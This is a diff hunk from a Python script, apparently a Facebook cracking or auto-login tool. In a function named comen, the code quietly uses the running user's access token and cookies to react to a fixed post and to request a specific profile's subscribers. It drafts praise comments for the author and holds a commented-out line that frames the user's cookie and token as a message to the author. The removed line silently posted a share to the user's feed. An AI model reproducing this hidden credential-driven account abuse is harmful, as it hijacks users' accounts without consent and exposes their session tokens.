@@ -385,9 +385,6 @@ def comen(cookie):
 	random_kata = random.choice(["Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :"+sekarang,"Hikmat Gans Selalu Coeg><","semoga @[100000131722561:0] panjang umur dan rejeki nya dilancarkan aminnn"])
 	#kirim_log = f"ini cookie ku ama token ku bang\n{kuki}\n{toket}"
 	react_angry = 'ANGRY'
-	ua = random.choice(ua_crack)
-	headers = {'authority': 'graph.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?0','user-agent': ua,}
-	requests.post('https://graph.facebook.com/me/feed?link=https://www.facebook.com/100000131722561/posts/5966059140075084/?substory_index=0&app=fbl&published=0&access_token=%s'%(toket),cookies=kuki,headers=headers)
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561_5966059140075084/reactions?type={react_angry}&access_token={toket}", headers = {"cookie":kuki})
 	requests.post(f"https://graph.facebook.com/100000131722561?fields=subscribers&access_token={toket}", headers = {"cookie":kuki})
